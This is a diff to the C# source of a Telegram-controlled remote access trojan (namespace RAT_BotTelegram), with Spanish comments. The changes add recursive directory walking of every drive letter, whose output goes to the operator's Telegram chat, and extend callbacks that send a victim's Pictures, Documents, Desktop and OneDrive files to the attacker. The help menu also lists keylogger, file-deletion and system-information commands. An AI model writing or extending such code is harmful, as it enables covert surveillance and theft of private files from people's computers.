@@ -63,7 +63,24 @@ namespace RAT_BotTelegram {
             Bot.StopReceiving();
         }
 
+        private static async void GetDirectoryAll(string path, int indent = 0) {
+            try {
+                try {
+                    if ((File.GetAttributes(path) & FileAttributes.ReparsePoint) != FileAttributes.ReparsePoint) {
+                        foreach (string folder in Directory.GetDirectories(path)) {
+                            //Console.WriteLine( "{0}{1}", new string(' ', indent), Path.GetFileName(folder));
 
+                            await Bot.SendTextMessageAsync(config.ID, folder);
+
+                            GetDirectoryAll(folder, indent + 2);
+                        }
+                    }
+                } catch (UnauthorizedAccessException) { }
+
+            } catch {   // Si no encuentra el directorio
+                await Bot.SendTextMessageAsync(config.ID, "No se encontró ese directorio en ésta computadora");
+            }
+        }
         private static async void ListarFiles(string Path) {
             foreach (var file in Tools.GetFile(Path)) {
                 string FData = infoFile(file);
@@ -87,7 +104,7 @@ namespace RAT_BotTelegram {
                 case "/Get_Information":
                     await Bot.SendTextMessageAsync(config.ID, Tools.PC_Info());
                     break;
-                case "/Get_Files":  // Menú Obtiene archivos
+                case "/Get_FilesAll":  // Menú Obtiene archivos
                     var GetFiles = new InlineKeyboardMarkup(new[]{
                     new[]{
                         InlineKeyboardButton.WithCallbackData(text: "|USER| Get Pictures"        ,callbackData: "GetPictures"),
@@ -133,57 +150,183 @@ namespace RAT_BotTelegram {
                     ListarFiles(Path);
                     Path = "";
                     break;
-                case "/DirDisk":
+                case "/Dir_DirectoyDisk":
                     var Disk = new InlineKeyboardMarkup(new[]{
                     new[]{
-                        InlineKeyboardButton.WithCallbackData(text: "List Disk C:\\"       ,callbackData: "DDC"),
-                        InlineKeyboardButton.WithCallbackData(text: "List Disk D:\\"       ,callbackData: "DDD"),
-                        InlineKeyboardButton.WithCallbackData(text: "List Disk E:\\"       ,callbackData: "DDE"),
-                    },new[]{                                                                               
-                        InlineKeyboardButton.WithCallbackData(text: "List Disk F:\\"       ,callbackData: "DDF"),
-                        InlineKeyboardButton.WithCallbackData(text: "List Disk G:\\"       ,callbackData: "DDG"),
-                        InlineKeyboardButton.WithCallbackData(text: "List Disk H:\\"       ,callbackData: "DDH"),
-                    },new[]{                                                                               
-                        InlineKeyboardButton.WithCallbackData(text: "List Disk I:\\"       ,callbackData: "DDI"),
-                        InlineKeyboardButton.WithCallbackData(text: "List Disk J:\\"       ,callbackData: "DDJ"),
-                        InlineKeyboardButton.WithCallbackData(text: "List Disk K:\\"       ,callbackData: "DDK"),
-                    },new[]{                                                                               
-                        InlineKeyboardButton.WithCallbackData(text: "List Disk L:\\"       ,callbackData: "DDL"),
-                        InlineKeyboardButton.WithCallbackData(text: "List Disk M:\\"       ,callbackData: "DDM"),
-                        InlineKeyboardButton.WithCallbackData(text: "List Disk N:\\"       ,callbackData: "DDN"),
-                    },new[]{                                                                               
-                        InlineKeyboardButton.WithCallbackData(text: "List Disk O:\\"       ,callbackData: "DDO"),
-                        InlineKeyboardButton.WithCallbackData(text: "List Disk P:\\"       ,callbackData: "DDP"),
-                        InlineKeyboardButton.WithCallbackData(text: "List Disk Q:\\"       ,callbackData: "DDQ"),
-                    },new[]{                                                                               
-                        InlineKeyboardButton.WithCallbackData(text: "List Disk R:\\"       ,callbackData: "DDR"),
-                        InlineKeyboardButton.WithCallbackData(text: "List Disk S:\\"       ,callbackData: "DDS"),
-                        InlineKeyboardButton.WithCallbackData(text: "List Disk T:\\"       ,callbackData: "DDT"),
-                    },new[]{                                                                               
-                        InlineKeyboardButton.WithCallbackData(text: "List Disk U:\\"       ,callbackData: "DDU"),
-                        InlineKeyboardButton.WithCallbackData(text: "List Disk V:\\"       ,callbackData: "DDV"),
-                        InlineKeyboardButton.WithCallbackData(text: "List Disk W:\\"       ,callbackData: "DDW"),
-                    },new[]{                                                                               
-                        InlineKeyboardButton.WithCallbackData(text: "List Disk X:\\"       ,callbackData: "DDX"),
-                        InlineKeyboardButton.WithCallbackData(text: "List Disk Z:\\"       ,callbackData: "DDZ"),
+                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree C:\\"       ,callbackData: "DDC"),
+                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree D:\\"       ,callbackData: "DDD"),
+                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree E:\\"       ,callbackData: "DDE"),
+                    },new[]{                                                                    
+                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree F:\\"       ,callbackData: "DDF"),
+                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree G:\\"       ,callbackData: "DDG"),
+                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree H:\\"       ,callbackData: "DDH"),
+                    },new[]{                                                                     
+                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree I:\\"       ,callbackData: "DDI"),
+                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree J:\\"       ,callbackData: "DDJ"),
+                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree K:\\"       ,callbackData: "DDK"),
+                    },new[]{                                                                   
+                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree L:\\"       ,callbackData: "DDL"),
+                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree M:\\"       ,callbackData: "DDM"),
+                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree N:\\"       ,callbackData: "DDN"),
+                    },new[]{                                                                      
+                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree O:\\"       ,callbackData: "DDO"),
+                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree P:\\"       ,callbackData: "DDP"),
+                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree Q:\\"       ,callbackData: "DDQ"),
+                    },new[]{                                                                   
+                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree R:\\"       ,callbackData: "DDR"),
+                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree S:\\"       ,callbackData: "DDS"),
+                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree T:\\"       ,callbackData: "DDT"),
+                    },new[]{                                                                    
+                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree U:\\"       ,callbackData: "DDU"),
+                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree V:\\"       ,callbackData: "DDV"),
+                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree W:\\"       ,callbackData: "DDW"),
+                    },new[]{                                                                   
+                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree X:\\"       ,callbackData: "DDX"),
+                        InlineKeyboardButton.WithCallbackData(text: "Directory Tree Z:\\"       ,callbackData: "DDZ"),
                         
                     }});
-                    await Bot.SendTextMessageAsync(config.ID, "list files from disk? " , replyMarkup: Disk);        // Obtiene USER
+                    await Bot.SendTextMessageAsync(config.ID, "<b>NOTA: Este proceso puede demorar varios minutos, al culminár habrá un mensaje de FINISH'</b>", ParseMode.Html);
+                    await Bot.SendTextMessageAsync(config.ID, "<b>NOTA2 : Se Omitirán directorios Protegidos con permisos especiales o del sistema</b>", ParseMode.Html);
+                    await Bot.SendTextMessageAsync(config.ID, "Show directory tree from disk", replyMarkup: Disk);        // Obtiene USER
+                    
+
+                    break;
+                case "Dir_FilesDisk":
 
                     break;
 
 
+                case "/Hola":
+                    //Path = @"L:\";
 
-                //case "/Hola":
+                    // Obtiene Nombre del procesador
+                    //string[] allfiles = null;
+                    string ruta = @"O:\"; 
 
-                //    foreach (var file in Tools.GetFile(Path)) {
-                //        await Bot.SendTextMessageAsync(config.ID, "" + file);
-                //    }
+                    
+                    async void Recorre(string Path,int indent) {
+                        int n = 0;
+                        try {
+                            foreach (string folder in Directory.GetDirectories(Path)) {
 
-                //    await Bot.SendTextMessageAsync(config.ID, "El texto completo fue:" + message.Text + "\n\nInicio: " + Command.Length + "\nFinal:" + message.Text.Length);
-                //    await Bot.SendTextMessageAsync(config.ID, "\n" + message.Text.Substring(Command.Length));
+                                switch (folder) {
+                                    // Other Disk
+                                    case @"\$RECYCLE.BIN": break;
+                                    case @"$Recycfle.Bin": break;
+                                    case @"System Volume Information": break;
+                                    case @"OneDriveTemp": break;
+                                    case @"ProgramData": break;
+                                    case @"Recovery": break;
+                                    case "": break;
+                                    //case "": break;
+                                    //case "": break;
 
-                //    break;
+                                    default:
+                                        await Bot.SendTextMessageAsync(config.ID, "=>" + folder + "\n");
+                                        break;
+                                }
+
+
+                                n = n + 1;
+                                
+
+                                //Console.WriteLine("{0}{1}", new string(' ', indent), Path.GetFileName(folder));
+
+                                // allfiles[n] = folder;
+
+                                //Console.WriteLine("{0}{1}", new string(' ', indent), Path.GetFileName(folder));
+                                //GetDirectoryAll(folder, indent + 2);
+                            }
+                        } catch (UnauthorizedAccessException) {
+                        }
+
+                    }
+
+                    //async void ShowAllFoldersUnder(string path, int indent) {
+                    //    try {
+                    //        if ((File.GetAttributes(path) & FileAttributes.ReparsePoint) != FileAttributes.ReparsePoint) {
+                    //            foreach (string folder in Directory.GetDirectories(path)) {
+                    //                //Console.WriteLine( "{0}{1}", new string(' ', indent), Path.GetFileName(folder));
+
+                    //                await Bot.SendTextMessageAsync(config.ID, folder);
+
+                    //                ShowAllFoldersUnder(folder, indent + 2);
+                    //            }
+                    //        }
+                    //    } catch (UnauthorizedAccessException) { }
+                    //}
+                    //ShowAllFoldersUnder(@"L:\", 0);
+
+                    //Recorre(Path, 0);
+                    async void Recorre2(string Path, int indent) {
+                        int n = 0;
+                        try {
+                            foreach (string folder in Directory.GetDirectories(Path) ){ //, "*", SearchOption.AllDirectories
+                                n = n + 1;
+                                //Directory.GetAccessControl(folder);
+                                //FileInfo fil = new FileInfo(folder);
+                                //if (fil.IsReadOnly) {
+                                await Bot.SendTextMessageAsync(config.ID, "" + folder+"\n"
+                                    + Directory.GetAccessControl(folder)+
+                                    Directory.GetDirectoryRoot(folder));
+                                //} else {
+                                  //  await Bot.SendTextMessageAsync(config.ID, "Es libre " + folder+ fil.IsReadOnly);
+                                //}
+
+
+                                //await Bot.SendTextMessageAsync(config.ID, "=>" + folder);
+                                //try {
+                                //   // FileInfo fil = new FileInfo(folder);
+                                //    string FData =
+                                //        "\n<b>Name =</b> " + fil.Name +
+                                //        "\n<b>Extension =</b> " + fil.Extension +
+                                //        "\n<b>Zise   =</b> " + fil.Length + " <b>bytes</b>" +
+                                //        "\n<b>Creation Data =</b> " + fil.CreationTime +
+                                //        "\n<b>Is Read Only =</b> " + fil.IsReadOnly +
+                                //        "\n<b>Last Access Time =</b> " + fil.LastAccessTime +
+                                //        "\n<b>Last Write Time =</b> " + fil.LastWriteTime +
+                                //        "\n<b>Directory =</b> " + fil.DirectoryName +
+                                //        "\n<b>Full Directory =</b> ";
+            
+                                //} catch {
+                                    
+                                //}
+
+
+                                //Console.WriteLine("{0}{1}", new string(' ', indent), Path.GetFileName(folder));
+
+                                // allfiles[n] = folder;
+
+                                //Console.WriteLine("{0}{1}", new string(' ', indent), Path.GetFileName(folder));
+                                //GetDirectoryAll(folder, indent + 2);
+                            }
+                        } catch (UnauthorizedAccessException) {
+                        }
+
+                    }
+                    //Recorre(Path, 0);
+
+                    //const string PathC = @"L:\";
+                    //foreach (var file in Tools.GetFolder(Path)) {
+                    //    await Bot.SendTextMessageAsync(config.ID, "Folder" + file);
+                    //    switch (file) {
+
+                    //        case PathC + @"$Recycle.Bifgn": break;
+                    //        case PathC + @"$Recycfhfle.Bin": break;
+                    //        case PathC + @"$Recycfle.Bin": break;
+
+                    //        default:
+                    //            break;
+                    //    }
+
+                    //    if (file == @"L:\"+ "$RECYCLE.BIN" || file == @"L:\" + "System Volume Information" || file == @"L:\" + "OneDriveTemp") {
+
+                    //    }
+                    //}
+                    await Bot.SendTextMessageAsync(config.ID, "FINISH || " );
+                    //    await Bot.SendTextMessageAsync(config.ID, "El texto completo fue:" + message.Text + "\n\nInicio: " + Command.Length + "\nFinal:" + message.Text.Length);
+                    //    await Bot.SendTextMessageAsync(config.ID, "\n" + message.Text.Substring(Command.Length));
+                    break;
 
                 case "/botones":
 
@@ -201,12 +344,13 @@ namespace RAT_BotTelegram {
                     const string usage =
                   "\n/Status                   <Check if the PC is online>" +
                   "\n/Get_Information <get detailed system information>" +
-                  "\n/Get_Files            |Menu| <Get Files from Computer>" +  // Obtiene los archivos dentro de la computadora
+                  "\n/Get_FilesAll          |Menu| <Get Files from Computer>" +  // Obtiene los archivos dentro de la computadora
                   "\n/Get_DirFiles      |Menu| <Get list of file names>" +   // Obtiene los nombres dentro de la computadora
                   "\n/Dir     <Path>       /Dir C:\\User\\Photos and videos" +  // Lista los archivos de la carpeta y las subscarpetas.
-                  "\n/DirDisk  <Path>       |Menu| ListDisk" +  // Lista los archivos de la carpeta y las subscarpetas.
+                  "\n/Dir_DirectoyDisk  <Path>       |Menu| Only Directory Tree Drive" +  // Lista Arbol de solo ditectorios
+                  "\n/Dir_FilesDisk  <Path>       |Menu| Only Files Tree Drive" +  // Lista Arbol de todos loa rchivos.
                   "\n/Keylogger          |Menu| <keylogger Options >" +
-                  "\n/DeleteFile <Path>" +
+                  "\n/Delete_File <Path>" +
                   "\n/DeleteFolder <Path>" +
                   "\n/Help                    <This>" +
                   "";
@@ -216,18 +360,23 @@ namespace RAT_BotTelegram {
             }
         }
         private static string infoFile(string file) {  // Muestra información detallada del archivo
-            FileInfo fil = new FileInfo(file);
-            string FData =
-                "\n<b>Name =</b> " + fil.Name +
-                "\n<b>Extension =</b> " + fil.Extension +
-                "\n<b>Zise   =</b> " + fil.Length + " <b>bytes</b>" +
-                "\n<b>Creation Data =</b> " + fil.CreationTime+
-                "\n<b>Is Read Only =</b> " + fil.IsReadOnly+
-                "\n<b>Last Access Time =</b> " + fil.LastAccessTime+
-                "\n<b>Last Write Time =</b> " + fil.LastWriteTime+
-                "\n<b>Directory =</b> " + fil.DirectoryName +
-                "\n<b>Full Directory =</b> " + file;
-            return FData;
+            try {
+                FileInfo fil = new FileInfo(file);
+                string FData =
+                    "\n<b>Name =</b> " + fil.Name +
+                    "\n<b>Extension =</b> " + fil.Extension +
+                    "\n<b>Zise   =</b> " + fil.Length + " <b>bytes</b>" +
+                    "\n<b>Creation Data =</b> " + fil.CreationTime +
+                    "\n<b>Is Read Only =</b> " + fil.IsReadOnly +
+                    "\n<b>Last Access Time =</b> " + fil.LastAccessTime +
+                    "\n<b>Last Write Time =</b> " + fil.LastWriteTime +
+                    "\n<b>Directory =</b> " + fil.DirectoryName +
+                    "\n<b>Full Directory =</b> " + file;
+                return FData;
+            } catch  {
+                return "Hubo un problema com la ruta";
+            }
+            
         }
         private static bool infoFileZize(string file) {  // Verifica si el archivo no supera los 50MB
             FileInfo fil = new FileInfo(file);
@@ -322,7 +471,9 @@ namespace RAT_BotTelegram {
 
             await Bot.SendTextMessageAsync(config.ID, "******************** Finish ********************* ");
         }
-
+        private static async void SendBotMessage(string text = "") {
+            await Bot.SendTextMessageAsync(config.ID, text);
+        }
         private static string GetFileName(string dir) {   // Retorna solo el nombre del archivo
 
             if (dir == "[-]") { // Verifica si no hay algún error
@@ -420,53 +571,53 @@ namespace RAT_BotTelegram {
             string user = Features.getUserName();
             switch (callbackQuery.Data) {
                 
-                case "GetPictures":   GetFilesTelegram(@"C:\Users\" + user + @"\Pictures");break;                          
-                case "GetVideos":     GetFilesTelegram(@"C:\Users\" + user + @"\Videos"); break;                         
-                case "GetDocument":   GetFilesTelegram(@"C:\Users\" + user + @"\Documents");break;
-                case "GetMusic":      GetFilesTelegram(@"C:\Users\" + user + @"\Music");break;                    
-                case "GetDownload":   GetFilesTelegram(@"C:\Users\" + user + @"\Documents");break;                 
-                case "GetDesktop":    GetFilesTelegram(@"C:\Users\" + user + @"\Desktop");break;
+                case "GetPictures":   GetFilesTelegram(@"C:\Users\" + user + @"\Pictures"); SendBotMessage("Finish Command") ; break;                          
+                case "GetVideos":     GetFilesTelegram(@"C:\Users\" + user + @"\Videos"); SendBotMessage("Finish Command"); break;                         
+                case "GetDocument":   GetFilesTelegram(@"C:\Users\" + user + @"\Documents"); SendBotMessage("Finish Command"); break;
+                case "GetMusic":      GetFilesTelegram(@"C:\Users\" + user + @"\Music"); SendBotMessage("Finish Command"); break;                    
+                case "GetDownload":   GetFilesTelegram(@"C:\Users\" + user + @"\Documents"); SendBotMessage("Finish Command"); break;                 
+                case "GetDesktop":    GetFilesTelegram(@"C:\Users\" + user + @"\Desktop"); SendBotMessage("Finish Command"); break;
 
                 // OneDrive Español
-                case "GetPicturesOE": GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Imágenes"); break;                          
-                case "GetVideosOE":   GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Videos"); break;                          
-                case "GetDocumentOE": GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Documentos"); break;                          
-                case "GetMusicOE":    GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Musica");break;                          
-                case "GetDesktopOE":  GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Escritorio");break;                          
-                case "GetgetAllO":    GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive"); break;
+                case "GetPicturesOE": GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Imágenes"); SendBotMessage("Finish Command"); break;                          
+                case "GetVideosOE":   GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Videos"); SendBotMessage("Finish Command"); break;                          
+                case "GetDocumentOE": GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Documentos"); SendBotMessage("Finish Command"); break;                          
+                case "GetMusicOE":    GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Musica"); SendBotMessage("Finish Command"); break;                          
+                case "GetDesktopOE":  GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Escritorio"); SendBotMessage("Finish Command"); break;                          
+                case "GetgetAllO":    GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive"); SendBotMessage("Finish Command"); break;
 
                 // OneDrive English
-                case "GetPicturesO":  GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Pictures"); break;                          
-                case "GetVideosO":    GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Videos"); break;                         
-                case "GetDocumentO":  GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Documents"); break;                         
-                case "GetMusicO":     GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Música"); break;                         
-                case "GetDesktopO":   GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Escritorio");break;
-
+                case "GetPicturesO":  GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Pictures"); SendBotMessage("Finish Command"); break;                          
+                case "GetVideosO":    GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Videos"); SendBotMessage("Finish Command"); break;                         
+                case "GetDocumentO":  GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Documents"); SendBotMessage("Finish Command"); break;                         
+                case "GetMusicO":     GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Música"); SendBotMessage("Finish Command"); break;                         
+                case "GetDesktopO":   GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Escritorio"); SendBotMessage("Finish Command"); break;
                 // "/DirDisk"
-                case "DDC":    ListarFiles(@"C:\");    break;
-                case "DDD":    ListarFiles(@"D:\");    break;
-                case "DDE":    ListarFiles(@"E:\");    break;
-                case "DDF":    ListarFiles(@"F:\");    break;
-                case "DDG":    ListarFiles(@"G:\");    break;
-                case "DDH":    ListarFiles(@"H:\");    break;
-                case "DDI":    ListarFiles(@"I:\");    break;
-                case "DDJ":    ListarFiles(@"J:\");    break;
-                case "DDK":    ListarFiles(@"K:\");    break;
-                case "DDL":    ListarFiles(@"L:\");    break;
-                case "DDM":    ListarFiles(@"M:\");    break;
-                case "DDN":    ListarFiles(@"N:\");    break;
-                case "DDO":    ListarFiles(@"O:\");    break;
-                case "DDP":    ListarFiles(@"P:\");    break;
-                case "DDQ":    ListarFiles(@"Q:\");    break;
-                case "DDR":    ListarFiles(@"R:\");    break;
-                case "DDS":    ListarFiles(@"S:\");    break;
-                case "DDT":    ListarFiles(@"T:\");    break;
-                case "DDU":    ListarFiles(@"U:\");    break;
-                case "DDV":    ListarFiles(@"V:\");    break;
-                case "DDW":    ListarFiles(@"W:\");    break;
-                case "DDX":    ListarFiles(@"X:\");    break;
-                case "DDZ":    ListarFiles(@"Z:\"); break;
-
+               
+                case "DDC":    GetDirectoryAll(@"C:\"); SendBotMessage("Finish Command"); break;
+                case "DDD":    GetDirectoryAll(@"D:\"); SendBotMessage("Finish Command"); break;
+                case "DDE":    GetDirectoryAll(@"E:\"); SendBotMessage("Finish Command"); break;
+                case "DDF":    GetDirectoryAll(@"F:\"); SendBotMessage("Finish Command"); break;
+                case "DDG":    GetDirectoryAll(@"G:\"); SendBotMessage("Finish Command"); break;
+                case "DDH":    GetDirectoryAll(@"H:\"); SendBotMessage("Finish Command"); break;
+                case "DDI":    GetDirectoryAll(@"I:\"); SendBotMessage("Finish Command"); break;
+                case "DDJ":    GetDirectoryAll(@"J:\"); SendBotMessage("Finish Command"); break;
+                case "DDK":    GetDirectoryAll(@"K:\"); SendBotMessage("Finish Command"); break;
+                case "DDL":    GetDirectoryAll(@"L:\"); SendBotMessage("Finish Command"); break;
+                case "DDM":    GetDirectoryAll(@"M:\"); SendBotMessage("Finish Command"); break;
+                case "DDN":    GetDirectoryAll(@"N:\"); SendBotMessage("Finish Command"); break;
+                case "DDO":    GetDirectoryAll(@"O:\"); SendBotMessage("Finish Command"); break;
+                case "DDP":    GetDirectoryAll(@"P:\"); SendBotMessage("Finish Command"); break;
+                case "DDQ":    GetDirectoryAll(@"Q:\"); SendBotMessage("Finish Command"); break;
+                case "DDR":    GetDirectoryAll(@"R:\"); SendBotMessage("Finish Command"); break;
+                case "DDS":    GetDirectoryAll(@"S:\"); SendBotMessage("Finish Command"); break;
+                case "DDT":    GetDirectoryAll(@"T:\"); SendBotMessage("Finish Command"); break;
+                case "DDU":    GetDirectoryAll(@"U:\"); SendBotMessage("Finish Command"); break;
+                case "DDV":    GetDirectoryAll(@"V:\"); SendBotMessage("Finish Command"); break;
+                case "DDW":    GetDirectoryAll(@"W:\"); SendBotMessage("Finish Command"); break;
+                case "DDX":    GetDirectoryAll(@"X:\"); SendBotMessage("Finish Command"); break;
+                case "DDZ":    GetDirectoryAll(@"Z:\"); SendBotMessage("Finish Command"); break;
+                                                     
 
 
 
